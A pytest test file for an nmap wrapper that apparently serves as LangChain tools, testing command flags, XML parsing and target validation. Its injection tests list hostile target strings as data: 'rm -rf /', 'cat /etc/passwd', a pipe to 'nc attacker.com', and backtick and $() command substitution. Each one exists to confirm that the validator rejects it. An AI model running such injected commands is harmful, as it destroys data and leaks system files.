"""Tests for Nmap Integration Module

This module contains comprehensive tests for the nmap_integration module,
including unit tests with mocked subprocess calls.
"""

import asyncio
import pytest
import xml.etree.ElementTree as ET
from unittest.mock import Mock, patch, MagicMock

# Import the module under test
from tools.nmap_integration import (
    NmapScanner,
    NmapPort,
    NmapHost,
    NmapResult,
    ScanType,
    TimingTemplate,
    nmap_scan,
    nmap_quick_scan,
    nmap_vuln_scan,
    create_nmap_result_dict,
)


# Sample XML output for testing
SAMPLE_NMAP_XML = """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sS -T3 -p 80,443 -oX - scanme.nmap.org">
<host starttime="1234567890">
    <status state="up" reason="syn-ack"/>
    <address addr="45.33.32.156" addrtype="ipv4"/>
    <hostnames>
        <hostname name="scanme.nmap.org" type="user"/>
    </hostnames>
    <ports>
        <port protocol="tcp" portid="80">
            <state state="open" reason="syn-ack"/>
            <service name="http" product="Apache httpd" version="2.4.7">
                <cpe>cpe:/a:apache:http_server:2.4.7</cpe>
            </service>
            <script id="http-title" output="Go ahead and ScanMe!"/>
        </port>
        <port protocol="tcp" portid="443">
            <state state="open" reason="syn-ack"/>
            <service name="https" product="Apache httpd" version="2.4.7" tunnel="ssl"/>
        </port>
        <port protocol="tcp" portid="22">
            <state state="closed" reason="reset"/>
            <service name="ssh"/>
        </port>
    </ports>
    <os>
        <osmatch name="Linux 3.x" accuracy="95" line="12345"/>
        <osmatch name="Linux 4.x" accuracy="90" line="12346"/>
    </os>
    <hostscript>
        <script id="nbstat" output="NetBIOS name: TEST"/>
    </hostscript>
</host>
</nmaprun>"""

SAMPLE_NMAP_XML_NO_HOSTS = """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sS 192.168.255.255">
<runstats>
    <finished time="1234567890"/>
    <hosts up="0" down="1" total="1"/>
</runstats>
</nmaprun>"""


class TestNmapScannerInit:
    """Test NmapScanner initialization"""

    def test_init_with_single_target(self):
        """Test initialization with single target"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            assert scanner.targets == ["192.168.1.1"]
            assert scanner.options["timing"] == TimingTemplate.NORMAL
            assert scanner.options["scan_type"] == ScanType.SYN

    def test_init_with_multiple_targets(self):
        """Test initialization with multiple targets"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner(["192.168.1.1", "192.168.1.2"])
            assert scanner.targets == ["192.168.1.1", "192.168.1.2"]

    def test_init_with_cidr(self):
        """Test initialization with CIDR notation"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.0/24")
            assert scanner.targets == ["192.168.1.0/24"]

    def test_init_with_options(self):
        """Test initialization with custom options"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            options = {
                "ports": "80,443",
                "timing": TimingTemplate.AGGRESSIVE,
                "service_detection": True,
            }
            scanner = NmapScanner("scanme.nmap.org", options)
            assert scanner.options["ports"] == "80,443"
            assert scanner.options["timing"] == TimingTemplate.AGGRESSIVE
            assert scanner.options["service_detection"] is True

    def test_init_nmap_not_found(self):
        """Test error when nmap is not found"""
        with patch("shutil.which", return_value=None):
            with pytest.raises(RuntimeError) as exc_info:
                NmapScanner("192.168.1.1", nmap_path="nonexistent_nmap")
            assert "nmap not found" in str(exc_info.value)

    def test_init_invalid_target_characters(self):
        """Test that dangerous characters are rejected"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with pytest.raises(ValueError) as exc_info:
                NmapScanner("192.168.1.1; rm -rf /")
            assert "Invalid characters" in str(exc_info.value)

    def test_init_pipe_in_target(self):
        """Test that pipe character is rejected"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with pytest.raises(ValueError) as exc_info:
                NmapScanner("192.168.1.1 | cat /etc/passwd")
            assert "Invalid characters" in str(exc_info.value)


class TestCommandBuilding:
    """Test command line building"""

    @pytest.fixture
    def scanner(self):
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            return NmapScanner("192.168.1.1")

    def test_basic_command(self, scanner):
        """Test basic command structure"""
        cmd = scanner._build_command()
        assert cmd[0] == "/usr/bin/nmap"
        assert "-sS" in cmd  # SYN scan
        assert "-T3" in cmd  # Normal timing
        assert "-oX" in cmd  # XML output
        assert "-" in cmd  # stdout
        assert "192.168.1.1" in cmd  # target

    def test_scan_types(self, scanner):
        """Test different scan types"""
        test_cases = [
            (ScanType.SYN, "-sS"),
            (ScanType.CONNECT, "-sT"),
            (ScanType.UDP, "-sU"),
            (ScanType.FIN, "-sF"),
            (ScanType.NULL, "-sN"),
            (ScanType.XMAS, "-sX"),
            (ScanType.ACK, "-sA"),
        ]

        for scan_type, expected_flag in test_cases:
            scanner.options["scan_type"] = scan_type
            cmd = scanner._build_command()
            assert expected_flag in cmd

    def test_timing_templates(self, scanner):
        """Test timing template flags"""
        test_cases = [
            (TimingTemplate.PARANOID, "-T0"),
            (TimingTemplate.SNEAKY, "-T1"),
            (TimingTemplate.POLITE, "-T2"),
            (TimingTemplate.NORMAL, "-T3"),
            (TimingTemplate.AGGRESSIVE, "-T4"),
            (TimingTemplate.INSANE, "-T5"),
        ]

        for timing, expected_flag in test_cases:
            scanner.options["timing"] = timing
            cmd = scanner._build_command()
            assert expected_flag in cmd

    def test_port_specification(self, scanner):
        """Test port specification"""
        scanner.options["ports"] = "80,443,8080"
        cmd = scanner._build_command()
        assert "-p" in cmd
        assert "80,443,8080" in cmd

    def test_top_ports_preset(self, scanner):
        """Test top ports preset"""
        scanner.options["ports"] = "top-10"
        cmd = scanner._build_command()
        assert "-p" in cmd
        # Should contain common ports
        assert any(port in str(cmd) for port in ["22", "80", "443"])

    def test_service_detection(self, scanner):
        """Test service detection flag"""
        scanner.options["service_detection"] = True
        cmd = scanner._build_command()
        assert "-sV" in cmd

    def test_os_detection(self, scanner):
        """Test OS detection flag"""
        scanner.options["os_detection"] = True
        cmd = scanner._build_command()
        assert "-O" in cmd
        assert "--osscan-limit" in cmd

    def test_script_scan_default(self, scanner):
        """Test default script scan"""
        scanner.options["script_scan"] = True
        cmd = scanner._build_command()
        assert "-sC" in cmd

    def test_script_scan_specific(self, scanner):
        """Test specific script scan"""
        scanner.options["script_scan"] = "http-title,vulners"
        cmd = scanner._build_command()
        assert "--script" in cmd
        assert "http-title,vulners" in cmd

    def test_script_scan_list(self, scanner):
        """Test script scan with list"""
        scanner.options["script_scan"] = ["http-title", "vulners"]
        cmd = scanner._build_command()
        assert "--script" in cmd
        assert "http-title,vulners" in cmd

    def test_aggressive_scan(self, scanner):
        """Test aggressive scan flag"""
        scanner.options["aggressive"] = True
        cmd = scanner._build_command()
        assert "-A" in cmd

    def test_no_ping(self, scanner):
        """Test no ping flag"""
        scanner.options["no_ping"] = True
        cmd = scanner._build_command()
        assert "-Pn" in cmd

    def test_verbosity(self, scanner):
        """Test verbosity levels"""
        scanner.options["verbosity"] = 2
        cmd = scanner._build_command()
        assert "-vv" in cmd

    def test_debugging(self, scanner):
        """Test debugging levels"""
        scanner.options["debugging"] = 1
        cmd = scanner._build_command()
        assert "-d" in cmd

    def test_additional_args(self, scanner):
        """Test additional arguments"""
        scanner.options["additional_args"] = ["--randomize-hosts", "--max-retries", "3"]
        cmd = scanner._build_command()
        assert "--randomize-hosts" in cmd
        assert "3" in cmd


class TestXMLParsing:
    """Test XML output parsing"""

    def test_parse_host(self):
        """Test parsing a single host"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML)

            assert len(hosts) == 1
            host = hosts[0]
            assert host.ip == "45.33.32.156"
            assert host.hostname == "scanme.nmap.org"
            assert host.status == "up"
            assert host.os_match == "Linux 3.x"
            assert host.os_accuracy == 95

    def test_parse_ports(self):
        """Test parsing port information"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML)

            host = hosts[0]
            assert len(host.ports) == 3

            # Check open port 80
            port_80 = next(p for p in host.ports if p.port == 80)
            assert port_80.protocol == "tcp"
            assert port_80.state == "open"
            assert port_80.service == "http"
            # Version field contains version string, not full product name
            assert port_80.version == "2.4.7" or "Apache" in port_80.version
            assert len(port_80.cpe) > 0
            assert "http-title" in port_80.scripts

            # Check closed port 22
            port_22 = next(p for p in host.ports if p.port == 22)
            assert port_22.state == "closed"

    def test_parse_os_matches(self):
        """Test parsing OS fingerprinting results"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML)

            host = hosts[0]
            assert len(host.os_matches) == 2
            assert host.os_matches[0]["name"] == "Linux 3.x"
            assert host.os_matches[0]["accuracy"] == 95

    def test_parse_host_scripts(self):
        """Test parsing host script output"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML)

            host = hosts[0]
            assert "nbstat" in host.host_scripts

    def test_parse_no_hosts(self):
        """Test parsing output with no hosts found"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.255.255")
            hosts = scanner.parse_xml_output(SAMPLE_NMAP_XML_NO_HOSTS)
            assert len(hosts) == 0

    def test_parse_malformed_xml(self):
        """Test fallback parsing for malformed XML"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            malformed = "<host><address addr=\"192.168.1.1\" addrtype=\"ipv4\"/></invalid>"
            # Should not raise exception
            hosts = scanner.parse_xml_output(malformed)
            # May have partial results or empty list
            assert isinstance(hosts, list)


class TestAsyncScanning:
    """Test async scanning functionality"""

    def test_successful_scan(self):
        """Test successful scan execution"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                # Use asyncio.run for async test
                result = asyncio.run(scanner.scan())

                assert result.success is True
                assert len(result.hosts) == 1
                assert result.error is None
                assert result.scan_time > 0
                assert "total_hosts" in result.summary

    def test_scan_failure(self):
        """Test scan failure handling"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")

            mock_result = Mock()
            mock_result.returncode = 1
            mock_result.stdout = ""
            mock_result.stderr = "Error: Invalid target"

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.scan())

                assert result.success is False
                assert "Error" in result.error

    def test_scan_exception(self):
        """Test exception handling during scan"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")

            with patch.object(scanner, "_run_subprocess", side_effect=Exception("Network error")):
                result = asyncio.run(scanner.scan())

                assert result.success is False
                assert "Network error" in result.error


class TestConvenienceMethods:
    """Test convenience scan methods"""

    def test_scan_ports(self):
        """Test scan_ports method"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.scan_ports(ports="80,443", scan_type=ScanType.SYN))

                assert result["success"] is True
                assert "hosts" in result
                assert "summary" in result

    def test_service_detection(self):
        """Test service_detection method"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.service_detection(ports="80,443"))

                assert result["success"] is True
                assert scanner.options["service_detection"] is True

    def test_os_detection(self):
        """Test os_detection method"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.os_detection(ports="80,443"))

                assert result["success"] is True
                assert scanner.options["os_detection"] is True

    def test_run_script(self):
        """Test run_script method"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = SAMPLE_NMAP_XML
            mock_result.stderr = ""

            with patch.object(scanner, "_run_subprocess", return_value=mock_result):
                result = asyncio.run(scanner.run_script(
                    script_name="http-title",
                    ports="80",
                    script_args={"http.useragent": "Mozilla/5.0"},
                ))

                assert result["success"] is True
                assert scanner.options["script_scan"] == "http-title"


class TestLangChainTools:
    """Test LangChain tool wrappers"""

    def test_nmap_scan_tool(self):
        """Test nmap_scan tool function"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with patch("asyncio.run") as mock_run:
                mock_result = Mock()
                mock_result.success = True
                mock_result.scan_time = 5.0
                mock_result.command = "nmap -sS scanme.nmap.org"
                mock_result.hosts = []
                mock_result.summary = {"total_hosts": 0}

                mock_run.return_value = mock_result

                result = nmap_scan("scanme.nmap.org")
                assert "scan completed" in result or isinstance(result, str)

    def test_nmap_quick_scan_tool(self):
        """Test nmap_quick_scan tool function"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with patch("asyncio.run") as mock_run:
                mock_result = Mock()
                mock_result.success = True
                mock_result.hosts = []

                mock_run.return_value = mock_result

                result = nmap_quick_scan("192.168.1.1")
                assert isinstance(result, str)

    def test_nmap_vuln_scan_tool(self):
        """Test nmap_vuln_scan tool function"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with patch("asyncio.run") as mock_run:
                mock_result = Mock()
                mock_result.success = True
                mock_result.hosts = []

                mock_run.return_value = mock_result

                result = nmap_vuln_scan("192.168.1.1")
                assert isinstance(result, str)


class TestHelperFunctions:
    """Test helper functions"""

    def test_create_nmap_result_dict(self):
        """Test result dictionary creation"""
        host = NmapHost(
            ip="192.168.1.1",
            status="up",
            ports=[
                NmapPort(port=80, protocol="tcp", state="open", service="http"),
                NmapPort(port=443, protocol="tcp", state="open", service="https"),
                NmapPort(port=22, protocol="tcp", state="closed", service="ssh"),
            ],
        )

        result = create_nmap_result_dict([host])

        assert result["tool"] == "nmap"
        assert result["total_hosts"] == 1
        assert result["hosts_up"] == 1
        assert len(result["open_ports"]) == 2

        # Check open port info
        port_80 = next(p for p in result["open_ports"] if p["port"] == 80)
        assert port_80["service"] == "http"
        assert port_80["host"] == "192.168.1.1"


class TestSecurity:
    """Test security features"""

    def test_command_injection_prevention(self):
        """Test that command injection is prevented"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            dangerous_targets = [
                "192.168.1.1; rm -rf /",
                "192.168.1.1 && cat /etc/passwd",
                "192.168.1.1 | nc attacker.com",
                "192.168.1.1`whoami`",
                "192.168.1.1$(cat /etc/passwd)",
            ]

            for target in dangerous_targets:
                with pytest.raises(ValueError) as exc_info:
                    NmapScanner(target)
                assert "Invalid characters" in str(exc_info.value)


class TestTargetValidation:
    """Test target validation"""

    def test_valid_ipv4(self):
        """Test valid IPv4 address"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")
            assert "192.168.1.1" in scanner.targets

    def test_valid_ipv6(self):
        """Test valid IPv6 address"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("::1")
            assert "::1" in scanner.targets

    def test_valid_cidr(self):
        """Test valid CIDR notation"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.0/24")
            assert "192.168.1.0/24" in scanner.targets

    def test_valid_hostname(self):
        """Test valid hostname"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("scanme.nmap.org")
            assert "scanme.nmap.org" in scanner.targets

    def test_empty_target(self):
        """Test empty target handling"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            with pytest.raises(ValueError):
                NmapScanner("")

    def test_multiple_valid_targets(self):
        """Test multiple target validation"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            targets = ["192.168.1.1", "scanme.nmap.org", "10.0.0.0/8"]
            scanner = NmapScanner(targets)
            assert len(scanner.targets) == 3


class TestResultFormatting:
    """Test result formatting and conversion"""

    def test_result_to_dict(self):
        """Test conversion of result to dictionary"""
        with patch("shutil.which", return_value="/usr/bin/nmap"):
            scanner = NmapScanner("192.168.1.1")

            host = NmapHost(
                ip="192.168.1.1",
                hostname="test.local",
                status="up",
                os_match="Linux 5.x",
                os_accuracy=98,
                ports=[
                    NmapPort(
                        port=80,
                        protocol="tcp",
                        state="open",
                        service="http",
                        version="nginx 1.18.0",
                        scripts={"http-title": "Welcome"},
                    ),
                ],
            )

            result = NmapResult(
                success=True,
                hosts=[host],
                command="nmap -sS 192.168.1.1",
                scan_time=10.5,
                summary={"total_hosts": 1},
            )

            result_dict = scanner._result_to_dict(result)

            assert result_dict["success"] is True
            assert result_dict["scan_time"] == 10.5
            assert len(result_dict["hosts"]) == 1

            host_dict = result_dict["hosts"][0]
            assert host_dict["ip"] == "192.168.1.1"
            assert host_dict["hostname"] == "test.local"
            assert len(host_dict["ports"]) == 1

            port_dict = host_dict["ports"][0]
            assert port_dict["port"] == 80
            assert port_dict["service"] == "http"
            assert port_dict["scripts"]["http-title"] == "Welcome"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
